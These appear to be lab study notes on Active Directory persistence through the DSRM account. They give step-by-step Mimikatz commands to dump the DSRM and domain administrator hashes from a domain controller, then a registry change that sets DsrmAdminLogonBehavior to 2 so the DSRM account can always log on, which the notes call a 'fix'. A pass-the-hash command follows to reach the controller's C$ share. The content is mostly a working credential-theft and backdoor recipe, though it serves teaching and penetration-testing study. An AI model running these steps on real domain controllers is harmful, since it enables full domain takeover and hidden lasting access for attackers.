**Directory Services Restore Mode** is a **special local administrator account** on every Domain Controller used for disaster recovery when Active Directory won't start.

> _"DSRM is a special local administrator account that exists on every Domain Controller, primarily used for recovery."_

### The Problem (By Default)

> DSRM account **cannot log in** when DC is running normally — only works in Safe Mode/Recovery Mode.

**Solution**: Modify registry to allow DSRM login anytime.

___

# Step 1: Dump DSRM Password Hash

```powershell
# Get the local SAM database (where DSRM password lives)
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName dcorp-dc

# Administrator:500:aad3b435...:a102ad5753f4c441e3af31c97fad86fd:::
# This is the **DSRM local admin** hash (not domain admin!)
```
### Compare with Domain Admin

```powershell
# Dump LSA (contains domain account hashes)
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dcorp-dc
```

>_"The Administrator hash from lsadump::sam is the DSRM local admin. The other is the domain Administrator."_

| Source                | What it is                                |
| --------------------- | ----------------------------------------- |
| `lsadump::sam`        | **DSRM** local admin (local SAM database) |
| `lsadump::lsa /patch` | **Domain** Administrator (AD database)    |

___
## Step 2: Enable DSRM Logon (Critical Registry Change)

**By default:** DSRM account cannot logon when DC is online

**The fix:** Modify registry on the DC

```powershell
# Connect to DC
Enter-PSSession -ComputerName dcorp-dc

# Enable DSRM logon
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

|Value|Behavior|
|---|---|
|`0` (default)|DSRM can ONLY logon in Safe Mode|
|`1`|DSRM can logon if NO DC is found|
|`2`|DSRM can logon **ANYTIME** (even online)|

___
## Step 3: Pass-the-Hash with DSRM

Now use the DSRM hash to authenticate as local Administrator:

```powershell
# Pass-the-hash using DSRM account
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
```

**Important:** Use `/domain:dcorp-dc` (the computer name), NOT the domain name!

Then verify access:

```bash
ls \\dcorp-dc\C$
```